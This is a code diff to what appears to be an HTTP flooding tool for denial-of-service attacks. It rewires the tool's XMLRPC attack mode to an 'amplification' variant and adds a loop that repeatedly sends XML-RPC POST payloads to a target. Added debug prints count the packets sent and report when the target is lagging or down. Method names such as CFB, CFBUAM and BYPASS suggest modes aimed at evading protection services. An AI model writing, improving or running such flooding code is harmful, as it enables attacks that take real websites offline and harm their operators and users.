@@ -879,7 +879,7 @@ class HttpFlood(Thread):
             "POST": self.POST,
             "CFB": self.CFB,
             "CFBUAM": self.CFBUAM,
-            "XMLRPC": self.XMLRPC,
+            "XMLRPC": self.XMLRPC_AMP,
             "BOT": self.BOT,
             "APACHE": self.APACHE,
             "BYPASS": self.BYPASS,
@@ -1715,9 +1715,25 @@ class HttpFlood(Thread):
                         f"{xml_payload}").encode("utf-8")
         
         s = None
-        with suppress(Exception), self.open_connection() as s:
+        # Use try-except to catch connection issues
+        try:
+            s = self.open_connection()
+            # Increment Global Counter
+            global CONNECTIONS_SENT
+            CONNECTIONS_SENT += 1
+            print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] XMLRPC: Amplification Packet Sent to {self._target.authority}")
+            
             for _ in range(self._rpc):
                 Tools.send(s, post_payload)
+        except Exception as e:
+            err = str(e)
+            if "timed out" in err or "Timeout" in err:
+                 print(f"[DEBUG] XMLRPC: Connection Timeout (Target Lagging/Down)")
+                 pass
+            elif "refused" in err or "Reset" in err:
+                pass
+            else:
+                pass
         Tools.safe_close(s)
 
 
